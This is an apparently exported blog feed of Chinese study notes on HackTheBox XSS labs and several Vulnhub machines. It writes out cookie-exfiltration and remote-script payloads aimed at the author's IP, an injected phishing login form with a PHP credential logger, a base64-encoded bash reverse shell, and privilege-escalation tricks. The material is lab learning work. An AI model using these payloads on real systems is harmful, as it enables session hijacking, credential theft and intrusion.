        <content type="html"><![CDATA[<h2 id="XSS-Testing-Payloads"><a href="#XSS-Testing-Payloads" class="headerlink" title="XSS Testing Payloads"></a>XSS Testing Payloads</h2><p>我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：</p><pre><code class="html">&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></pre><span id="more"></span><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>XSS Payloads</strong></td><td></td></tr><tr><td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;plaintext&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;script&gt;print()&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></td><td>HTML-based XSS Payload</td></tr><tr><td><code>&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;</code></td><td>Change Background Color</td></tr><tr><td><code>&lt;script&gt;document.body.background = &quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;&lt;/script&gt;</code></td><td>Change Background Image</td></tr><tr><td><code>&lt;script&gt;document.title = &#39;HackTheBox Academy&#39;&lt;/script&gt;</code></td><td>Change Website Title</td></tr><tr><td><code>&lt;script&gt;document.getElementsByTagName(&#39;body&#39;)[0].innerHTML = &#39;text&#39;&lt;/script&gt;</code></td><td>Overwrite website’s main body</td></tr><tr><td><code>&lt;script&gt;document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;</code></td><td>Remove certain HTML element</td></tr><tr><td><code>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></td><td>Load remote script</td></tr><tr><td><code>&lt;script&gt;new Image().src=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie&lt;/script&gt;</code></td><td>Send Cookie details to us</td></tr><tr><td><strong>Commands</strong></td><td></td></tr><tr><td><code>python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;</code></td><td>Run <code>xsstrike</code> on a url parameter</td></tr><tr><td><code>sudo nc -lvnp 80</code></td><td>Start <code>netcat</code> listener</td></tr><tr><td><code>sudo php -S 0.0.0.0:80</code></td><td>Start <code>PHP</code> server</td></tr></tbody></table><blockquote><p>提示：许多现代web应用程序使用跨域IFrame来处理用户输入，因此即使web表单易受XSS攻击，它也不会成为主web应用程序上的漏洞。这就是为什么我们在警告框中显示window.origin的值，而不是像1这样的静态值。在这种情况下，警报框会显示它正在执行的URL，并确认哪个表单是易受攻击的表单，以防使用IFrame。</p></blockquote><p>由于一些现代浏览器可能会在特定位置阻止<code>alert（）</code>JavaScript函数，因此了解一些其他基本的XSS有效载荷来验证XSS的存在可能会很方便。一个这样的XSS有效载荷是＜明文＞，它将停止呈现后面的HTML代码，并将其显示为明文。另一个容易发现的负载是<code>&lt;script&gt;print（）&lt;/script&gt;</code>，它将弹出浏览器打印对话框，任何浏览器都不太可能阻止它。试着使用这些有效载荷来看看每个有效载荷是如何工作的。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p><p>输入测试注入后发现可以触发XSS漏洞：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151618784.png" alt="image-20230815161839658"></p><p>然如注入</p><p><code>&lt;script&gt;alert( document.cookie)&lt;/script&gt;</code></p><p>从DOM读取cookie并反弹即可</p><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>有两种类型的非持久性XSS漏洞：反射XSS，由后端服务器处理；基于DOM的XSS，完全在客户端处理，永远不会到达后端服务器。与持久XSS不同，非持久XSS漏洞是暂时的，通过页面刷新不会持久存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。 当我们的输入到达后端服务器并在未经过滤或净化的情况下返回给我们时，就会出现反映的XSS漏洞。在许多情况下，我们的整个输入可能会返回给我们，比如错误消息或确认消息。在这些情况下，我们可能会尝试使用XSS有效载荷来查看它们是否执行。然而，由于这些通常是临时消息，一旦我们离开页面，它们就不会再次执行，因此它们是非持久性的。</p><p>正如我们所看到的，单引号确实包含我们的XSS负载“＜script＞alert（window.origin）&lt;&#x2F;script＞”。 如果我们再次访问Reflected页面，错误消息将不再出现，并且我们的XSS负载也不会执行，这意味着这个XSS漏洞确实是非持久性的。 但是，如果XSS漏洞是非持久性的，我们将如何用它来瞄准受害者？ 这取决于使用哪个HTTP请求将我们的输入发送到服务器。我们可以通过Firefox开发工具点击[CTRL+I]并选择“网络”选项卡来检查这一点。然后，我们可以再次放入测试负载，并点击“添加”发送它</p><p>正如我们所看到的，第一行显示我们的请求是一个GET请求。GET请求将它们的参数和数据作为URL的一部分发送。因此，为了针对用户，我们可以向他们发送一个包含我们的有效负载的URL。要获取URL，我们可以在发送XSS负载后从Firefox的URL栏中复制URL，也可以右键单击“网络”选项卡中的get请求，然后选择“复制”&gt;“复制URL”。一旦受害者访问此URL，XSS负载将执行</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p>这里发送payload后在浏览器中找到了该请求，然后可以复制其url发送给其他用户触发XSS，curl也是可以的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151635364.png" alt="image-20230815163500315"></p><h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><pre><code class="javascript">document.getElementById(&quot;todo&quot;).innerHTML = &quot;&lt;b&gt;Next Task:&lt;/b&gt; &quot; + decodeURIComponent(task);</code></pre><p>我们可以看到，我们可以控制输入，而输出没有被净化，所以这个页面应该容易受到DOM XSS的攻击。</p><h2 id="DOM-Attacks"><a href="#DOM-Attacks" class="headerlink" title="DOM Attacks"></a>DOM Attacks</h2><p>如果我们尝试以前使用过的XSS负载，我们会发现它不会执行。这是因为innerHTML函数不允许将其中的＜script＞标记用作安全功能。尽管如此，我们使用的许多其他XSS有效载荷都不包含＜script＞标签，比如下面的XSS有效负载：</p><pre><code class="html">&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></pre><h1 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h1><h2 id="Automated-Discovery"><a href="#Automated-Discovery" class="headerlink" title="Automated Discovery"></a>Automated Discovery</h2><p>几乎所有的Web应用程序漏洞扫描程序（如Nessus、Burp Pro或ZAP）都具有检测所有三种类型的XSS漏洞的各种功能。这些扫描仪通常进行两种类型的扫描：被动扫描，用于检查客户端代码中是否存在潜在的基于DOM的漏洞；主动扫描，用于发送各种类型的有效载荷，试图通过在页面源中注入有效载荷来触发XSS。</p><p>虽然付费工具在检测XSS漏洞方面通常具有更高的准确性（尤其是在需要安全绕过的情况下），但我们仍然可以找到开源工具来帮助我们识别潜在的XSS漏洞。这些工具通常通过识别网页中的输入字段，发送各种类型的XSS有效载荷，然后比较渲染的页面源，看看是否可以在其中找到相同的有效载荷，这可能表明XSS注入成功。尽管如此，这并不总是准确的，因为有时，即使注入了相同的有效载荷，由于各种原因，也可能无法成功执行，因此我们必须始终手动验证XSS注入。</p><p>可以帮助我们发现XSS的一些常见开源工具是<a href="https://github.com/s0md3v/XSStrike">XSS Strike</a>、<a href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>和 <a href="https://github.com/epsylon/xsser">XSSer</a>。我们可以通过gitclone将XSS Strike克隆到我们的VM来尝试：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.gitTanin@htb[/htb]$ cd XSStrikeTanin@htb[/htb]$ pip install -r requirements.txtTanin@htb[/htb]$ python xsstrike.py</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;         XSStrike v3.1.4[~] Checking for DOM vulnerabilities [+] WAF Status: Offline [!] Testing parameter: task [!] Reflections found: 1 [~] Analysing reflections [~] Generating payloads [!] Payloads generated: 3072 ------------------------------------------------------------[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; [!] Efficiency: 100 [!] Confidence: 10 [?] Would you like to continue scanning? [y/N]</code></pre><h2 id="Manual-Discovery"><a href="#Manual-Discovery" class="headerlink" title="Manual Discovery"></a>Manual Discovery</h2><p>当涉及到手动XSS发现时，发现XSS漏洞的难度取决于web应用程序的安全级别。基本XSS漏洞通常可以通过测试各种XSS有效载荷来发现，但识别高级XSS漏洞需要高级代码审查技能。</p><h4 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h4><p>查找XSS漏洞的最基本方法是针对给定网页中的输入字段手动测试各种XSS有效载荷。我们可以在网上找到XSS有效载荷的巨大列表，比如 [PayloadAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection&#x2F;README.md)上的或<a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>中的。然后，我们可以开始逐一测试这些有效载荷，方法是复制每个有效载荷并将其添加到我们的表单中，然后查看是否弹出警报框。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</p><p> What type of XSS was found on the above server? “name only”</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151738961.png" alt="image-20230815173856882"></p><p>我们使用工具进行扫描后发现email是可以注入xss的，然后把email参数用之前的测试代码测试了一下，发现确实可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151740417.png" alt="image-20230815174014373"></p><h1 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h1><p>另一种非常常见的XSS攻击是网络钓鱼攻击。网络钓鱼攻击通常利用看起来合法的信息诱骗受害者将其敏感信息发送给攻击者。XSS网络钓鱼攻击的一种常见形式是通过注入伪造的登录表单，将登录详细信息发送到攻击者的服务器，然后攻击者可以使用该服务器代表受害者登录并控制其帐户和敏感信息。 </p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p> 尝试为在上述服务器中的“&#x2F;philishing”中找到的图像URL表单找到一个有效的XSS负载，然后使用您在本节中学到的内容准备一个注入恶意登录表单的恶意URL。然后访问“&#x2F;philish&#x2F;send.php”将URL发送给受害者，他们将登录到恶意登录表单。如果您做得正确，您应该收到受害者的登录凭据，您可以使用该凭据登录到“&#x2F;philishing&#x2F;login.php”并获取标志。</p><p>我们来到钓鱼网站，确认网站可以注入后，尝试注入一个简单的钓鱼表单：</p><pre><code class="html">&lt;div&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;/div&gt;</code></pre><p>注入代码：</p><pre><code class="javascript">document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151835805.png" alt="image-20230815183544764"></p><p>在用户‘登录’之前，我们不应该让原页面出现在页面上，这违背了我们的“请登录以继续”这句话。因此，为了鼓励受害者使用登录表单，我们应该删除URL字段，这样他们可能会认为必须登录才能使用该页面。为此，我们可以使用JavaScript函数document.getElementById（）.remove（）函数。 要找到要删除的HTML元素的id，我们可以通过单击[CTRL+SHIFT+C]打开页面检查器选取器，然后单击我们需要的元素可以得到该表单的id，然后将其移除：</p><pre><code class="javascript">document.getElementById(&#39;urlform&#39;).remove();</code></pre><p>我们发现还有一个原始的html代码在我们注入的表单之后，再插入一个注释将其删除：</p><pre><code class="html">...PAYLOAD... &lt;!-- </code></pre><p>完整的payload为：</p><pre><code>&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.16.18&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--</code></pre><p>这里的开头要闭合一下前面的标签</p><p>最后我们得到了一下页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151901586.png" alt="image-20230815190115549"></p><p>此时我们用nc监听我们的80端口，然后用test：test”登录”网页：</p><p> <img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151905792.png" alt="image-20230815190550748"></p><p>我们盗取到了用户的凭证，然而，由于我们只使用netcat侦听器进行侦听，它将无法正确处理HTTP请求，受害者将收到“无法连接”错误，这可能会引起一些怀疑。因此，我们可以使用一个基本的PHP脚本来记录HTTP请求中的凭据，然后在不进行任何注入的情况下将受害者返回到原始页面。在这种情况下，受害者可能认为他们成功登录，并将按预期使用图像查看器。</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);    fputs($file, &quot;Username: &#123;$_GET[&#39;username&#39;]&#125; | Password: &#123;$_GET[&#39;password&#39;]&#125;\n&quot;);    header(&quot;Location: http://SERVER_IP/phishing/index.php&quot;);    fclose($file);    exit();&#125;?&gt;</code></pre><p>这里要把第五行的重定向地址更改为目标地址。<code>Location</code> 是一个 HTTP 响应头，用于指示浏览器重定向到另一个页面。当服务器返回带有 <code>Location</code> 头的响应时，浏览器会根据该头信息将用户自动重定向到指定的 URL。</p><p>写好文件后搭建一个php服务器：</p><p><code>sudo php -S 0.0.0.0:80</code></p><p>具体而言：</p><ul><li><code>sudo</code>: 使用超级用户权限执行命令，可能需要管理员密码验证。</li><li><code>php</code>: 启动 PHP 解释器。</li><li><code>-S</code>: 启动 PHP 内置的 Web 服务器。</li><li><code>0.0.0.0:80</code>: 指定服务器监听的 IP 地址为 0.0.0.0，这表示允许所有可用的网络接口访问。端口为 80，这是默认的 HTTP 端口。</li></ul><p>此时网页就会自动重定向到原网页了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151919924.png" alt="image-20230815191923844"></p><h1 id="Session-Hijacking"><a href="#Session-Hijacking" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h1><h2 id="Blind-XSS-Detection"><a href="#Blind-XSS-Detection" class="headerlink" title="Blind XSS Detection"></a>Blind XSS Detection</h2><p>盲XSS漏洞通常发生在只有特定用户（例如Admins）才能访问的表单中。一些潜在的例子包括： 联系人表格 评论 用户详细信息 支持票证 HTTP用户代理标头</p><p>我们将看不到我们的输入将如何处理，也看不到它在浏览器中的外观，因为它只会在我们无法访问的某个管理面板中显示给管理员。在正常情况下（即非盲），我们可以测试每个字段，直到我们得到一个警告框，就像我们在整个模块中所做的那样。然而，在这种情况下，由于我们无法访问Admin面板，如果我们看不到如何处理输出，我们如何检测XSS漏洞？</p><p>为此，我们可以使用上一节中使用的相同技巧，即使用JavaScript负载将HTTP请求发送回服务器。如果JavaScript代码被执行，我们将在机器上得到响应，我们就会知道页面确实存在漏洞。 然而，这引入了两个问题： 我们如何才能知道哪个特定领域是脆弱的？由于任何一个字段都可能执行我们的代码，所以我们不知道它们中的哪一个执行了。 我们如何知道要使用什么XSS有效载荷？既然页面可能有漏洞，但有效负载可能不起作用？</p><h2 id="Loading-a-Remote-Script"><a href="#Loading-a-Remote-Script" class="headerlink" title="Loading a Remote Script"></a>Loading a Remote Script</h2><p>在HTML中，我们可以在＜script＞标记中编写JavaScript代码，但我们也可以通过提供其URL来包含远程脚本，如下所示：</p><pre><code class="html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>因此，我们可以使用它来执行虚拟机上提供的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们正在注入的字段的名称，这样，当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段</p><p>如果我们收到&#x2F;username的请求，那么我们就知道username字段容易受到XSS的攻击，等等。这样，我们就可以开始测试加载远程脚本的各种XSS有效载荷，并查看其中哪些向我们发送请求。以下是我们可以从PayloadsAllTheThings中使用的几个示例：</p><pre><code class="html">&quot;&gt;&lt;script src=&quot;http://10.10.16.26/script.js&quot;&gt;&lt;/script&gt;</code></pre><pre><code>&quot;&gt;&lt;script new Image().src=&#39;http:/10.10.16.26/index.php?c=&#39;+document.cookie;&gt;&lt;/script&gt;</code></pre><pre><code class="html">&quot;&gt;&lt;script src=http://10.10.16.26&gt;&lt;/script&gt;javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://10.10.16.26\&#39;;document.body.appendChild(a)&#39;)&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//10.10.16.26&quot;);a.send();&lt;/script&gt;&lt;script&gt;$.getScript(&quot;http://10.10.16.26&quot;)&lt;/script&gt;</code></pre><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>What is the value of the ‘flag’ cookie?</p><p>网站大概是这么样子：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181824401.png" alt="image-20230818182419290"></p><p>发现没有url回显，只能手工注入检测</p><p>最后测试发现注入点是最下面的website</p><p>注入：</p><pre><code class="js">&quot;&gt;&lt;script src=&quot;http://10.10.16.26:8080/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>然后本地script.js:</p><pre><code>new Image().src=&#39;http://10.10.16.26:8080/index.php?c=&#39;+document.cookie;</code></pre><p>然后用nc监听一下8080端口或者在8080端口启动一个服务器：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181836067.png" alt="image-20230818183623972"></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub_learning</title>
      <link href="/2023/08/12/vulnhub-learning/"/>
      <url>/2023/08/12/vulnhub-learning/</url>
      
        <content type="html"><![CDATA[<p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p><span id="more"></span><h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p><ul><li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p></li><li><p>其中需要进行异或加密解密</p></li><li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p><pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p>这里查询了一下这个逗号：</p></li></ul><pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。在 Bash 中，花括号 &#123;&#125; 可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。</code></pre><ul><li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p></li><li><p>提权部分看到了两种调试工具：</p><ul><li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p><p>以下是一些常用的 <code>strings</code> 命令选项：</p><ul><li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li><li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li><li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li><li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li><li><code>-e encoding</code>：指定输入文件的字符编码。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li><li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p><p>以下是一些常用的 <code>strace</code> 命令选项：</p><ul><li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li><li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li><li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li><li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li><li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li><li><code>-c</code>：统计系统调用和出错情况的统计信息。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li></ul></li></ul><blockquote><p>strace -o output.txt ls -l</p><p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p></blockquote><h1 id="JANGOW"><a href="#JANGOW" class="headerlink" title="JANGOW"></a>JANGOW</h1><ul><li>有时候防火墙禁用nc -e 操作需要我们使用管道文件或者上传nc文件反弹shell，然后可以通过pty等一句话提权为交互式shell</li><li>其实一般的服务器做端口限制都不会限制80和443，可以把433作为反弹的端口，也可以用脚本简单探测一下：</li><li><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131125722.png" alt="image"></li></ul><pre><code>for i in &#123;1..65535&#125;;do timeout 1 nc -vz 192.168.11.128 $i &amp;&amp; echo &quot;$i open&quot;&gt;&gt; out.txt || echo &quot;si closed&quot; &gt;&gt; out.txt;done</code></pre><p>脚本的工作原理如下：</p><ol><li>使用 <code>for</code> 循环迭代端口范围从 1 到 65535。</li><li>对每个端口，使用 <code>timeout</code> 命令在 1 秒内尝试使用 <code>nc</code> 命令连接到指定的 IP 地址和端口。</li><li>如果连接成功，将输出 “$i open” 到 <code>out.txt</code> 文件。</li><li>如果连接失败（超时或连接被拒绝），将输出 “si closed” 到 <code>out.txt</code> 文件。</li><li><code>nc -vz</code> 是 <code>nc</code>（netcat）命令的一种使用方式，用于进行基本的网络连接测试和端口扫描。下面是对 <code>-vz</code> 参数的解释：<ul><li><code>-v</code>: 这个选项表示 “verbose”，即详细输出模式。当您使用 <code>-v</code> 参数时，<code>nc</code> 命令会显示更多关于连接和操作的详细信息，包括成功连接时的信息。</li><li><code>-z</code>: 这个选项表示 “zero-I&#x2F;O mode”，即零 I&#x2F;O 模式。在此模式下，<code>nc</code> 命令只会尝试建立连接，而不会进行实际的数据传输。这在执行端口扫描时很有用，因为它不会向目标发送任何实际的数据。</li></ul></li></ol><p>这里在博客<a href="https://www.cnblogs.com/sainet/p/15642784.html">Vulnhub 靶场 JANGOW: 1.0.1 - sainet - 博客园 (cnblogs.com)</a>中还提到一个端口绑定：</p><pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234</code></pre><blockquote><ul><li><code>iptables</code>: Linux 上的防火墙管理工具。</li><li><code>-A PREROUTING</code>: 添加规则到 PREROUTING 链，这是网络数据包进入路由处理之前的链。</li><li><code>-t nat</code>: 指定操作的表类型为 “nat”，用于网络地址转换。</li><li><code>-p tcp</code>: 指定匹配 TCP 协议的数据包。</li><li><code>--dport 1:65535</code>: 匹配目标端口范围从 1 到 65535。</li><li><code>-j REDIRECT --to-port 1234</code>: 如果匹配，将数据包重定向到本地的 1234 端口。</li></ul></blockquote><h1 id="red"><a href="#red" class="headerlink" title="red"></a>red</h1><p>这是目前位置做到最好的靶机</p><p><a href="https://www.cnblogs.com/upfine/p/16783668.html">upfine的博客 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/dgs1mple/p/16035221.html#">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p><ul><li><p>在web部分扫描到后文文件后打开是空白，此时需要再爆破一个参数进行传值</p></li><li><p>使用hashcat对密码行规则转换</p></li><li><p>提权部分切换用户打开shell：</p><p>sudo -u ippsec &#x2F;usr&#x2F;bin&#x2F;time &#x2F;bin&#x2F;bash</p></li><li><p>在拿到shell后，</p><ul><li>一个是查找用户有权限的文件</li></ul><p>find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc.</p><p>（他这里其实是查找的的目录-type d 而不是文件 -type f）</p><ul><li>另一个博主是上传<a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>监听系统运行的程序，然后发现了后门文件</li></ul></li></ul><p>在日志里发现执行后门代码的记录，命令：vi &#x2F;var&#x2F;log&#x2F;syslog，也查看了定时任务：vim &#x2F;etc&#x2F;crontab</p><p>使用命令：crontab -l可以查看执行后门文件的定时任务</p><h1 id="napping-1-0-1-ova"><a href="#napping-1-0-1-ova" class="headerlink" title="napping-1.0.1.ova."></a>napping-1.0.1.ova.</h1><p><a href="https://www.cnblogs.com/sainet/p/15650122.html">Vulnhub 靶场 NAPPING: 1.0.1 - sainet - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/csacs/article/details/104535225">Reverse Tabnabbing钓鱼_SoulCat.的博客-CSDN博客</a></p><p>这个靶机涉及到网络钓鱼，原理和刚学到的XSS差不多，但是Tab好像不需要设置钓鱼表单，在满足漏洞的情况下好像只需要监听端口就能接收到用户表单，这应该涉及到表单的提交和保存方式</p><p>提权部分修改py文件时使用的shell是 &#x2F;usr&#x2F;bin&#x2F;bash 而不是 &#x2F;bin&#x2F;shell执行脚本（在py文件中）,询问GPT一般用户也是可以使用&#x2F;bin&#x2F;bash的，但是这里可能是设置了权限，以后插入py文件应该要先测试相关情况。</p><p>vim提权时使用<code>！</code>可以执行外部shell命令，以此提权</p><h1 id="EMPIRE-BREAKOUT"><a href="#EMPIRE-BREAKOUT" class="headerlink" title="EMPIRE: BREAKOUT"></a>EMPIRE: BREAKOUT</h1><p><a href="https://www.cnblogs.com/sainet/p/15682132.html#3-10000-%E7%AB%AF%E5%8F%A3">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园 (cnblogs.com)</a></p><p>在web部分需要使用enum4linux工具检测服务器上的smb用户结合找到的密码登录后台，smbmap更适合当作客户端登录</p><p>提权部分需要寻找一些可用文件，一般来说对于网站可以寻找一些配置文件<code>*.conf</code> <code>*.config</code>等文件，对于本地提权则可以寻找一些隐藏文件、有权限的文件、密码文件等</p><p>这里白给了一个tar命令，使用getcap查看发现read&#x3D;ep，可以通过加解压对一些文件越权访问，命令：</p><p><code>./tar -cvf pass.tar /var/backups/.old_pass.bak</code></p><ul><li><code>-c</code>: 表示创建一个新的归档文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要创建的归档文件的名称。</li></ul><p><code>./tar -xvf pass.tar </code></p><ul><li><code>-x</code>: 表示从归档文件中提取（解压缩）文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要提取的归档文件的名称。</li></ul><h1 id="Vulnhub-Empire-LupinOne"><a href="#Vulnhub-Empire-LupinOne" class="headerlink" title="Vulnhub-Empire: LupinOne"></a>Vulnhub-Empire: LupinOne</h1><p><a href="https://www.cnblogs.com/C0ngvv/p/15607026.html">Vulnhub-Empire: LupinOne题解 - C0ngvv - 博客园 (cnblogs.com)</a></p><p>这里挺有意思的，在爬虫文件中找到了一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191102804.png" alt="img"></p><p>在而后的扫描中使用<code>~FUZZ</code>查找文件，这实际算得上一个提示hh。</p><p>在ssh密钥登录时，使用ssh -i 指定ssh_key</p><p>这里遇到一个Enter passphrase for key</p><blockquote><p>GPT:<br>在 SSH 连接时，”passphrase” 是指用于保护 SSH 私钥的密码。私钥是 SSH 